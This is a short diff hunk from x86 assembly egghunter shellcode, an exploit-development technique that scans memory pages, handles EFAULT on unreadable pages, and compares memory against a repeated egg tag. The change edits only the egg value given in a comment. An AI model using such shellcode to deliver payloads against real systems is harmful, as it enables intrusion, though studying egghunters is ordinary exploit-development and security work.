@@ -197,7 +197,7 @@ cmp al, 0xf2		; does the low-end of $eax equal 0xf2? In other words, did we get 
 popad			; restore our register values we preserved
 jz page_forward		; if we got an EFAULT, this page is unreadable, time to go to the next page!
 
-cmp [edx], ebx		; is what is stored at the address of $edx our egg (0x13981729) ?
+cmp [edx], ebx		; is what is stored at the address of $edx our egg (0x50905090) ?
 jnz address_check	; if it's not, let's advance into the page and see if we can't find that pesky egg
 
 cmp [edx+4], ebx	; we found our egg once, let's see if it's also in $edx + 4
